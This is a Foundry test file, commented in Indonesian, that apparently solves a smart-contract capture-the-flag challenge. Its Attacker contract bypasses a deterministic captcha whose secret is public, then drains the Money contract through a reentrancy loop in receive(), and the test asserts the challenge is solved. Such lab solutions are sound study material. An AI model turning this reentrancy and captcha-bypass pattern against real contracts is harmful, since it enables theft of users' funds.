// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/Money.sol";
import "../src/Captcha.sol";

// Kontrak Penyerang
contract Attacker {
    Money money;
    Captcha captcha;
    
    constructor(address _money, address _captcha) {
        money = Money(_money);
        captcha = Captcha(_captcha);
    }

    function attack() external payable {
        // 1. Kita butuh saldo awal agar lolos cek "require(balance > 0)"
        // Deposit 1 Ether
        money.save{value: 1 ether}();

        // 2. Panggil fungsi withdraw (load)
        withdraw();
    }

    function withdraw() internal {
        // [BYPASS CAPTCHA]
        // Karena logic captcha deterministik dan secret-nya public,
        // kita bisa generate captcha yang valid di blok yang sama.
        uint256 secret = money.secret(); 
        uint256 validCaptcha = captcha.generateCaptcha(secret);
        
        // Panggil load dengan captcha yang benar
        money.load(validCaptcha);
    }

    // [REENTRANCY EXPLOIT]
    // Fungsi ini akan dipanggil saat Money mengirim Ether ke kita
    receive() external payable {
        // Selama target masih punya uang, kita sedot lagi!
        if (address(money).balance > 0) {
            withdraw();
        }
    }
}

contract LocalSolve is Test {
    Setup setup;
    Money money;
    Captcha captcha;
    address hacker = makeAddr("hacker");

    function setUp() public {
        // Deploy Setup dengan modal 100 Ether (sesuai constructor Setup)
        setup = new Setup{value: 100 ether}();
        money = setup.moneyContract();
        captcha = setup.captchaContract();
        
        // Beri modal ke hacker buat mancing reentrancy
        vm.deal(hacker, 5 ether);
    }

    function test_Exploit() public {
        vm.startPrank(hacker);

        console.log("=== START ATTACK ===");
        console.log("Money Contract Balance (Initial):", address(money).balance);
        console.log("Hacker Balance (Initial):", hacker.balance);

        // 1. Deploy Kontrak Penyerang
        Attacker attacker = new Attacker(address(money), address(captcha));
        
        // 2. Jalankan serangan dengan modal 1 Ether
        attacker.attack{value: 1 ether}();

        vm.stopPrank();

        console.log("=== END ATTACK ===");
        console.log("Money Contract Balance (Final):", address(money).balance);
        
        // Verifikasi
        bool solved = setup.isSolved();
        assertTrue(solved, "GAGAL: Money contract belum kosong!");
    }
}
